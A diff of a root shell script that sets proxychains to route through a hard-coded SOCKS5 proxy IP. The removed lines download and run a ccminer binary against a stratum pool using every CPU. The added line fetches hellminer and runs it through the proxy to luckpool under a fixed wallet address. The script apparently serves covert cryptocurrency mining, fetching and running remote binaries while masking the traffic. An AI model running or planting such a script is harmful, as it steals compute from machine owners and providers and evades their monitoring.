@@ -1,13 +1,9 @@
 sudo -i
 apt update
 apt install proxychains
+
 sed -i 's/socks4/socks5/' /etc/proxychains.conf
 sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
 sed -i 's/9050/10663/' /etc/proxychains.conf
-wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
-wget -qO build https://github.com/renifer12/master/raw/master/ccminer
-chmod +x build
-chmod +x compile.sh
-./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
-./compile.sh
-echo succes
+
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && proxychains ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.wangsit -p x --cpu 8
